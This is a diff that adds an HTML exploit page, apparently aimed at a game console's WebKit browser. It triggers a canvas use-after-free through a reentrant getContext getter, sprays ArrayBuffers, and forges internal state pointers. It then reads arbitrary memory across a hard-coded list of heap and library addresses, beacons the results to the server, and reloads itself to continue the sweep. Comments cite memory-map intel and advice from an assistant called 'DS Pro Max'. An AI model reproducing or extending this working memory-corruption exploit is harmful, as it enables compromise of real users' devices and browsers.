@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V654</title></head>
+<body><pre id="out">V654 — targeted heap scan (ZigZag intel)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++%40];
+  img.src='/beacon/V654-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _bu;try{_bu=new BigUint64Array(_b8);}catch(e){}
+function f2h(v){_f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}return f2h(v);}
+
+/*
+ * ZIGZAG INTEL (Lua loader, 14.10, sys 674 vmmap):
+ *   SceLibcHeap: 0x310744000-0x310754000 (rec[74])
+ *   SceLibcHeap: 0x310D40000-0x310D50000 (sys 572)
+ *   Heap objects: 0x3105AF000-0x31071E000 (CClosure etc)
+ *   mmap_addr:   0x310620000
+ *   GPU map:     0x310ECC000-0x311704000
+ *   SceLibcHeap: 0x2000D4000-0x2001F4000 (recs 016-029)
+ *
+ * WebContent has DIFFERENT ASLR but SIMILAR structure.
+ * Strategy: Dense scan of 0x310500000-0x311000000 at 1MB steps,
+ * then 0x200000000 range, then wider sweeps.
+ *
+ * ALSO: On HIT, do MULTIPLE reads at different offsets to
+ * extract maximum data before moving on (DS Pro Max advice).
+ */
+
+try{localStorage.removeItem('v653_attempt');localStorage.removeItem('v653_hits');}catch(e){}
+try{localStorage.removeItem('v652_attempt');localStorage.removeItem('v652_result');}catch(e){}
+
+var TARGETS = [
+  /* Priority 1: Dense scan of CONFIRMED heap range (1MB steps) */
+  [0x00000003, 0x10500000, 'heap-0x310500000'],
+  [0x00000003, 0x10600000, 'heap-0x310600000'],
+  [0x00000003, 0x10700000, 'heap-0x310700000'],
+  [0x00000003, 0x10800000, 'heap-0x310800000'],
+  [0x00000003, 0x10900000, 'heap-0x310900000'],
+  [0x00000003, 0x10A00000, 'heap-0x310A00000'],
+  [0x00000003, 0x10B00000, 'heap-0x310B00000'],
+  [0x00000003, 0x10C00000, 'heap-0x310C00000'],
+  [0x00000003, 0x10D00000, 'heap-0x310D00000'],
+  [0x00000003, 0x10E00000, 'heap-0x310E00000'],
+  [0x00000003, 0x10F00000, 'heap-0x310F00000'],
+  [0x00000003, 0x11000000, 'heap-0x311000000'],
+
+  /* Priority 2: Second SceLibcHeap range */
+  [0x00000002, 0x000D0000, 'heap2-0x2000D0000'],
+  [0x00000002, 0x00100000, 'heap2-0x200100000'],
+  [0x00000002, 0x00180000, 'heap2-0x200180000'],
+
+  /* Priority 3: Wider heap sweep (4MB steps) */
+  [0x00000003, 0x11400000, 'heap-0x311400000'],
+  [0x00000003, 0x11800000, 'heap-0x311800000'],
+  [0x00000003, 0x12000000, 'heap-0x312000000'],
+  [0x00000003, 0x10000000, 'heap-0x310000000'],
+  [0x00000003, 0x10400000, 'heap-0x310400000'],
+
+  /* Priority 4: Code/lib (for ASLR slide if heap misses) */
+  [0x00000000, 0x60000000, 'eboot-0x60000000'],
+  [0x00000000, 0x72000000, 'eboot-0x72000000'],
+  [0x00000000, 0xCA000000, 'libc-0xCA000000'],
+  [0x00000001, 0xAB000000, 'libc-0x1AB000000'],
+];
+
+var MAX = TARGETS.length;
+var attempt = 0;
+try { attempt = parseInt(localStorage.getItem('v654_attempt')) || 0; } catch(e) {}
+var hits = '';
+try { hits = localStorage.getItem('v654_hits') || ''; } catch(e) {}
+
+bk('BOOT', 'a='+attempt+'/'+MAX+'|hits='+(hits?hits.split(';').length-1:0));
+say('Attempt ' + attempt + '/' + MAX);
+if(hits) say('Hits: ' + hits);
+
+if (attempt >= MAX) {
+  bk('DONE', 'all-'+MAX+'|hits='+hits);
+  say('Done. Hits: ' + (hits || 'none'));
+} else {
+  var tgt = TARGETS[attempt];
+  var tgtHi = tgt[0], tgtLo = tgt[1], tgtDesc = tgt[2];
+  var tgtHex = '0x'+('00000000'+tgtHi.toString(16)).slice(-8)+('00000000'+tgtLo.toString(16)).slice(-8);
+  bk('TGT', 'n='+attempt+'|'+tgtHex+'|'+tgtDesc);
+  say('-> ' + tgtHex + ' (' + tgtDesc + ')');
+
+  try { localStorage.setItem('v654_attempt', String(attempt + 1)); } catch(e) {}
+
+  /* === UAF TRIGGER === */
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer', uafOpts);
+
+  if (!innerCtx) {
+    bk('FAIL', 'no-inner');
+    setTimeout(function(){location.reload();},3000);
+  } else {
+    for (var f = 0; f < 600; f++) new ArrayBuffer(16);
+
+    var abs = new Array(200);
+    var dvs = new Array(200);
+    for (var s = 0; s < 200; s++) {
+      abs[s] = new ArrayBuffer(768);
+      dvs[s] = new DataView(abs[s]);
+    }
+
+    /* Forge m_stateStack → target address */
+    for (var w = 0; w < 200; w++) {
+      dvs[w].setUint32(112, tgtLo, true);
+      dvs[w].setUint32(116, tgtHi, true);
+      dvs[w].setUint32(120, 2, true);
+      dvs[w].setUint32(124, 1, true);
+    }
+
+    /* CRITICAL READ: lineWidth = 8 bytes at target+48 */
+    var lw = innerCtx.lineWidth;
+
+    /* === HIT! Page is mapped! === */
+    /* DS Pro Max advice: on hit, read MULTIPLE offsets */
+
+    var lwB = f2big(lw);
+    bk('HIT', '***'+tgtHex+'='+lwB+'***');
+    say('*** HIT: ' + tgtHex + ' -> lineWidth=' + lwB + ' ***');
+
+    /* Now read more data at different offsets via miterLimit (+64), globalAlpha (+56) */
+    /* These read from target+OFFSET where offset depends on State struct layout */
+
+    /* Try to read miterLimit (at +64 in State, so needs stateStack.m_buffer[0]+64) */
+    /* miterLimit is at State offset +64 → we get 8 bytes at target+64 */
+    var ml = -1;
+    try { ml = innerCtx.miterLimit; } catch(e) { ml = -888; }
+    var mlB = f2big(ml);
+
+    /* globalAlpha at State offset +0 (first field) → 8 bytes at target+0 */
+    var ga = -1;
+    try { ga = innerCtx.globalAlpha; } catch(e) { ga = -888; }
+    var gaB = f2big(ga);
+
+    /* shadowBlur at State offset +88 → 8 bytes at target+88 */
+    var sb = -1;
+    try { sb = innerCtx.shadowBlur; } catch(e) { sb = -888; }
+    var sbB = f2big(sb);
+
+    bk('DATA', tgtHex+'|lw='+lwB+'|ml='+mlB+'|ga='+gaB+'|sb='+sbB);
+    say('  miterLimit=' + mlB + ' globalAlpha=' + gaB + ' shadowBlur=' + sbB);
+
+    /* Clean up forge ASAP */
+    innerCtx = null;
+    for (var c = 0; c < 200; c++) {
+      dvs[c].setFloat64(112, 0, true);
+      dvs[c].setUint32(120, 0, true);
+      dvs[c].setUint32(124, 0, true);
+    }
+
+    /* Accumulate */
+    var hitStr = tgtHex+'=lw:'+lwB+',ml:'+mlB+',ga:'+gaB+',sb:'+sbB;
+    try {
+      hits = (localStorage.getItem('v654_hits')||'')+hitStr+';';
+      localStorage.setItem('v654_hits', hits);
+    } catch(e) {}
+
+    canvas._abs = abs;
+  }
+
+  bk('NEXT', 'reload-3s');
+  setTimeout(function(){location.reload();}, 3000);
+}
+</script>
+</body></html>
